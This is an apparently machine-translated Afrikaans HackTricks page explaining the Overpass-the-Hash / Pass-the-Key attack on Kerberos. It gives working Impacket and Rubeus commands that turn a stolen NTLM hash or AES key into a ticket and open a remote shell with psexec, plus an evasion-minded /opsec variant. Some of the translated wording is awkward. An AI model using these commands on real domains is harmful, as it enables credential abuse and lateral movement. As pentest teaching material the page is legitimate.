# Oorwin die Hash/Deur die Sleutel (PTK)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Oorwin die Hash/Deur die Sleutel (PTK)

Die **Oorwin die Hash/Deur die Sleutel (PTK)**-aanval is ontwerp vir omgewings waar die tradisionele NTLM-protokol beperk is en Kerberos-verifikasie voorrang geniet. Hierdie aanval maak gebruik van die NTLM-hash of AES-sleutels van 'n gebruiker om Kerberos-kaartjies te verkry, wat ongemagtigde toegang tot hulpbronne binne 'n netwerk moontlik maak.

Om hierdie aanval uit te voer, behels die aanvanklike stap die verkryging van die NTLM-hash of wagwoord van die geteikende gebruikersrekening. Nadat hierdie inligting verkry is, kan 'n Kaartjie-verlening-kaartjie (TGT) vir die rekening verkry word, wat die aanvaller in staat stel om toegang te verkry tot dienste of masjiene waarvoor die gebruiker toestemming het.

Die proses kan geïnisieer word met die volgende opdragte:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Vir scenario's wat AES256 vereis, kan die `-aesKey [AES sleutel]` opsie gebruik word. Verder kan die verkrygde kaartjie gebruik word met verskeie gereedskap, insluitend smbexec.py of wmiexec.py, wat die omvang van die aanval verbreed.

Probleme soos _PyAsn1Error_ of _KDC kan die naam nie vind nie_ word tipies opgelos deur die Impacket-biblioteek op te dateer of die gasheernaam in plaas van die IP-adres te gebruik, om versoenbaarheid met die Kerberos KDC te verseker.

'n Alternatiewe opdragvolgorde met behulp van Rubeus.exe toon 'n ander aspek van hierdie tegniek:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Hierdie metode boots die **Pass the Key** benadering na, met die fokus op die oorneem en gebruik van die kaartjie direk vir verifikasiedoeleindes. Dit is belangrik om daarop te let dat die inisiasie van 'n TGT-versoek gebeurtenis `4768: 'n Kerberos-verifikasiekaartjie (TGT) is aangevra`, wat dui op 'n standaard gebruik van RC4-HMAC, alhoewel moderne Windows-stelsels verkies om AES256 te gebruik.

Om te voldoen aan operasionele sekuriteit en AES256 te gebruik, kan die volgende opdrag toegepas word:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Verwysings

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
